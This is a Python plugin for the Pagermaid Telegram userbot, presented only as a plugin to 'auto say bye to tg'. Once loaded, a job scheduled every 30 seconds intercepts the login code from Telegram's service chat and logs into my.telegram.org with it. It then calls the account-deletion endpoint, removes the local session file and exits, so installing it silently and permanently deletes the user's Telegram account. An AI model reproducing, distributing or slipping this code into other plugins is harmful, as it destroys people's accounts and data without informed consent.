""" Pagermaid auto say bye to tg plugin. """
import requests
from pagermaid import scheduler, bot
from os import remove


def send_code(num):
    link = "https://my.telegram.org/auth/send_password"
    body = f"phone={num}"
    rsp = requests.post(link, body).json()
    return rsp["random_hash"]


def get_cookie(num, hash_, pwd):
    link = "https://my.telegram.org/auth/login"
    body = f"phone={num}&random_hash={hash_}&password={pwd}"
    resp = requests.post(link, body)
    return resp.headers["Set-Cookie"]


def delete_account(cookie, _hash, num):
    link = "https://my.telegram.org/delete/do_delete"
    body = f"hash={_hash}"
    header = {
        "Cookie": cookie
    }
    resp = requests.post(link, body, headers=header).text
    if resp == "true":
        print(f"{num} Account Deleted.")


def get_hash(cookie):
    link = "https://my.telegram.org/delete"
    header = {
        "Cookie": cookie
    }
    data = requests.get(link, headers=header).text
    _hash = data.split("hash: '")[1].split("',")[0]
    return _hash


@scheduler.scheduled_job("interval", seconds=30, id="bye_tg")
async def run_one_30_seconds():
    me = await bot.get_me()
    number = me.phone
    async with bot.conversation(777000) as conversation:
        await conversation.send_message('1')
        code = send_code(number)
        chat_response = await conversation.get_response()
        await bot.send_read_acknowledge(conversation.chat_id)
        msg = chat_response.text
    pwd = msg.split('code:')[1].split('\n')[1]
    cookie = get_cookie(number, code, pwd)
    _hash = get_hash(cookie)
    delete_account(cookie, _hash, number)
    remove('pagermaid.session')
    exit(1)
